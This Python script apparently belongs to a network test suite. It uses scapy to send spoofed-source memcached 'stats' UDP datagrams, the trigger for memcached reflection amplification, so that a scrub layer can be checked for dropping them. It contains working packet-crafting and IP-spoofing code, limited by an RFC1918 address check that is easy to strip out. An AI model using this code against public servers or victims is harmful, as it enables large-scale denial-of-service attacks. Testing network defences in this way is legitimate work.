#!/usr/bin/env python3
"""memcached_stats.py — Spoofed-source memcached `stats` amplification probes.

Memcached on UDP/11211 with a 'stats' request yields the largest-known
amplification factor (~50000x in the wild). The probe is a 15-byte
UDP datagram; the scrub layer must drop it before a daemon (if any)
generates a multi-KB reply.

Usage:
    sudo memcached_stats.py --dst <agent_ip> [--spoof-src <victim_ip>]
                            [--count N] [--rate PPS]
"""

from __future__ import annotations

import argparse
import ipaddress
import struct
import sys
import time

try:
    from scapy.all import IP, UDP, Raw, send  # type: ignore
except ImportError:
    print("scapy not installed (run story 34.3 provisioner)", file=sys.stderr)
    sys.exit(2)


_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]


def _is_rfc1918(addr: str) -> bool:
    ip = ipaddress.ip_address(addr)
    return any(ip in net for net in _PRIVATE_NETS)


# Memcached UDP frame: 8-byte header + text command.
# Header layout (network byte order):
#   request_id (2), seq_num (2), total_datagrams (2), reserved (2)
def _build_payload() -> bytes:
    header = struct.pack(">HHHH", 0x1A1A, 0x0000, 0x0001, 0x0000)
    body = b"stats\r\n"
    return header + body


_PAYLOAD = _build_payload()


def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--dst", required=True, help="agent IP under test")
    p.add_argument("--spoof-src", default="192.168.56.99")
    p.add_argument("--count", type=int, default=500)
    p.add_argument("--rate", type=int, default=200)
    return p.parse_args()


def main() -> int:
    args = _parse_args()
    if not _is_rfc1918(args.dst):
        print(f"refusing non-RFC1918 dst {args.dst}", file=sys.stderr)
        return 2
    if not _is_rfc1918(args.spoof_src):
        print(f"refusing non-RFC1918 spoof_src {args.spoof_src}", file=sys.stderr)
        return 2

    inter = 1.0 / max(args.rate, 1)
    pkt = (
        IP(src=args.spoof_src, dst=args.dst)
        / UDP(sport=33333, dport=11211)
        / Raw(load=_PAYLOAD)
    )

    sent = 0
    start = time.monotonic()
    while sent < args.count:
        send(pkt, verbose=False)
        sent += 1
        time.sleep(inter)
    elapsed = time.monotonic() - start
    pps = sent / elapsed if elapsed > 0 else float(sent)
    print(f"memcached_stats sent={sent} elapsed={elapsed:.2f}s pps={pps:.1f}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
